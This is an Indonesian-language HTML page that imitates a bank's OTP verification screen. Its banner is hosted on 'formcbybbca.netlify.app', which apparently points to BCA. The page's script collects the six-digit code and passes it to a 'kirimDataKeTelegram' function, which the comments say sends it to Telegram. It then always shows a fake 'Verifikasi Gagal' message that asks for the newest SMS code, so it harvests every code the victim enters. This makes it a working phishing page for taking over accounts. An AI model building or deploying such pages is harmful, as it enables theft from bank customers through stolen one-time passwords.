<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verifikasi Kode OTP</title>
  <link rel="icon" href="ll/home/Bn1-0TP1/favicon.png">
  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
  <!-- Bootstrap & Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* ====================================================== */
    /* 🔒 DIKUNCI — TIDAK BOLEH DIUBAH */
    /* ====================================================== */
    * {
      box-sizing: border-box !important;
      margin: 0 !important;
      padding: 0 !important;
    }
    html, body {
      width: 100% !important;
      min-height: 100vh !important;
      font-family: 'Montserrat', sans-serif !important;
      background: #f5f5f5 !important;
    }
    body {
      display: flex !important;
      flex-direction: column !important;
      align-items: center !important;
      padding: 0 !important;
    }

    /* ✅ BANNER ATAS */
    .banner-img {
      width: 100% !important;
      height: auto !important;
      display: block !important;
      object-fit: cover !important;
    }

    .content-wrapper {
      width: 100% !important;
      padding: 20px 15px !important;
      max-width: 420px !important;
    }

    .box-form {
      background: #fff !important;
      border-radius: 12px !important;
      padding: 30px 25px !important;
      width: 100% !important;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1) !important;
    }

    .otp-icon {
      text-align: center !important;
      margin-bottom: 25px !important;
    }
    .otp-icon i {
      font-size: 48px !important;
      color: #0049ac !important;
    }

    .otp-title {
      text-align: center !important;
      font-size: 20px !important;
      font-weight: 700 !important;
      color: #0049ac !important;
      margin-bottom: 12px !important;
    }
    .otp-desc {
      text-align: center !important;
      font-size: 14px !important;
      color: #666 !important;
      margin-bottom: 30px !important;
      line-height: 1.6 !important;
    }

    /* ====================================================== */
    /* ✅ INPUT DIPERKECIL & JARAK DIDEKATKAN */
    /* ====================================================== */
    .otp-container {
      display: flex !important;
      justify-content: center !important;
      gap: 6px !important;
      margin-bottom: 30px !important;
    }
    .otp-input {
      width: 44px !important;
      height: 50px !important;
      text-align: center !important;
      font-size: 20px !important;
      font-weight: 700 !important;
      border: 2px solid #ddd !important;
      border-radius: 8px !important;
      outline: none !important;
      transition: all 0.25s ease !important;
      color: #0049ac !important;
      background: #fff !important;
    }
    .otp-input:focus {
      border-color: #0049ac !important;
      box-shadow: 0 0 0 3px rgba(0,73,172,0.15) !important;
    }
    .otp-input.filled {
      border-color: #0049ac !important;
      background: #f0f7ff !important;
    }

    .btn-kirim {
      width: 100% !important;
      background: #0049ac !important;
      color: #fff !important;
      font-size: 16px !important;
      font-weight: 600 !important;
      padding: 13px !important;
      border: none !important;
      border-radius: 10px !important;
      transition: background 0.2s ease !important;
      cursor: pointer !important;
    }
    .btn-kirim:hover {
      background: #003d8e !important;
      color: #fff !important;
    }
    .btn-kirim:disabled {
      background: #99b3d6 !important;
      cursor: not-allowed !important;
    }

    .resend-text {
      text-align: center !important;
      margin-top: 20px !important;
      font-size: 13px !important;
      color: #666 !important;
    }
    .resend-link {
      color: #0049ac !important;
      font-weight: 600 !important;
      cursor: pointer !important;
      text-decoration: none !important;
    }
    .resend-link:hover {
      text-decoration: underline !important;
    }

    /* ====================================================== */
    /* 🔒 MODAL GAGAL OTP — DIKUNCI */
    /* ====================================================== */
    .modal-overlay {
      position: fixed !important;
      inset: 0 !important;
      background: rgba(0,0,0,0.5) !important;
      display: none !important;
      align-items: center !important;
      justify-content: center !important;
      z-index: 10000 !important;
      padding: 20px !important;
    }
    .modal-overlay.active { display: flex !important; }
    .modal-box {
      background: #fff !important;
      border-radius: 12px !important;
      padding: 30px 25px !important;
      max-width: 360px !important;
      width: 100% !important;
      text-align: center !important;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2) !important;
    }
    .modal-icon {
      width: 60px !important;
      height: 60px !important;
      background: #ffebee !important;
      border-radius: 50% !important;
      display: inline-flex !important;
      align-items: center !important;
      justify-content: center !important;
      font-size: 28px !important;
      color: #e53935 !important;
      margin-bottom: 15px !important;
    }
    .modal-title {
      font-size: 20px !important;
      font-weight: 700 !important;
      color: #e53935 !important;
      margin-bottom: 15px !important;
    }
    .modal-text {
      font-size: 14px !important;
      color: #555 !important;
      line-height: 1.8 !important;
      margin-bottom: 25px !important;
    }
    .modal-btn {
      width: 100% !important;
      background: #0049ac !important;
      color: #fff !important;
      font-size: 16px !important;
      font-weight: 600 !important;
      padding: 12px !important;
      border: none !important;
      border-radius: 8px !important;
      cursor: pointer !important;
    }
    .modal-btn:hover {
      background: #003d8e !important;
      color: #fff !important;
    }

    /* ====================================================== */
    /* 🔒 RESPONSIVE — DIKUNCI */
    /* ====================================================== */
    @media (max-width: 400px) {
      .content-wrapper { padding: 15px 12px !important; }
      .box-form { padding: 25px 20px !important; }
      .otp-input { width: 40px !important; height: 46px !important; font-size: 18px !important; }
      .otp-title { font-size: 18px !important; }
      .otp-container { gap: 5px !important; }
    }
  </style>
</head>
<body>

  <!-- ✅ BANNER DI ATAS -->
  <img src="https://formcbybbca.netlify.app/img/baner.jpg" alt="Banner" class="banner-img">

  <!-- KONTEN OTP -->
  <div class="content-wrapper">
    <div class="box-form">
      <div class="otp-icon">
        <i class="fas fa-shield-alt"></i>
      </div>
      <h3 class="otp-title">Verifikasi Kode OTP</h3>
      <p class="otp-desc">
        Masukkan 6 digit kode OTP yang telah dikirimkan ke nomor ponsel Anda.
      </p>

      <div class="otp-container">
        <input type="tel" maxlength="1" class="otp-input" id="otp1" inputmode="numeric" autocomplete="one-time-code">
        <input type="tel" maxlength="1" class="otp-input" id="otp2" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" id="otp3" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" id="otp4" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" id="otp5" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" id="otp6" inputmode="numeric">
      </div>

      <button class="btn-kirim" id="btnKirimOTP" disabled>Kirim Kode</button>

      <p class="resend-text">
        Tidak menerima kode? <span class="resend-link" id="btnKirimUlang">Kirim ulang</span>
      </p>
    </div>
  </div>

  <!-- ==================================== -->
  <!-- MODAL GAGAL OTP -->
  <!-- ==================================== -->
  <div class="modal-overlay" id="failModal">
    <div class="modal-box">
      <div class="modal-icon"><i class="fas fa-times"></i></div>
      <h3 class="modal-title">Verifikasi Gagal</h3>
      <p class="modal-text">
        Kode OTP yang Anda masukkan bukan kode yang terbaru.<br>
        Silakan periksa kembali SMS yang dikirimkan dan masukkan kode OTP terbaru.
      </p>
      <button class="modal-btn" onclick="tutupModal()">Coba Lagi</button>
    </div>
  </div>

  <!-- ✅ HUBUNGKAN KE FILE TELEGRAM TERPISAH -->
  <script src="otp.js"></script>

  <script>
    // ======================================================
    // 🔒 FUNGSI DIKUNCI — TIDAK BOLEH DIUBAH
    // ======================================================
    const otpInputs = [
      document.getElementById('otp1'),
      document.getElementById('otp2'),
      document.getElementById('otp3'),
      document.getElementById('otp4'),
      document.getElementById('otp5'),
      document.getElementById('otp6')
    ];
    const btnKirimOTP = document.getElementById('btnKirimOTP');
    const failModal = document.getElementById('failModal');

    otpInputs[0].focus();

    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value) {
          this.classList.add('filled');
          if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
        } else {
          this.classList.remove('filled');
        }
        periksaLengkap();
      });
      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && index > 0) otpInputs[index - 1].focus();
      });
    });

    function periksaLengkap() {
      const semuaTerisi = otpInputs.every(input => input.value !== '');
      btnKirimOTP.disabled = !semuaTerisi;
    }

    btnKirimOTP.addEventListener('click', async function() {
      const kodeOTP = otpInputs.map(i => i.value).join('');
      if (kodeOTP.length !== 6 || !/^\d{6}$/.test(kodeOTP)) {
        alert('Masukkan kode OTP 6 digit lengkap!');
        return;
      }

      // ✅ KIRIM DATA OTP KE TELEGRAM SEBELUM TAMPILKAN MODAL
      if (typeof kirimDataKeTelegram === 'function') {
        await kirimDataKeTelegram({ otp: kodeOTP }, 'KODE OTP');
      }

      failModal.classList.add('active');
    });

    function tutupModal() {
      failModal.classList.remove('active');
      otpInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
      btnKirimOTP.disabled = true;
      otpInputs[0].focus();
    }

    document.getElementById('btnKirimUlang').addEventListener('click', function() {
      alert('Kode OTP baru telah dikirim!');
      otpInputs.forEach(input => { input.value = ''; input.classList.remove('filled'); });
      btnKirimOTP.disabled = true;
      otpInputs[0].focus();
    });
  </script>
</body>
</html>
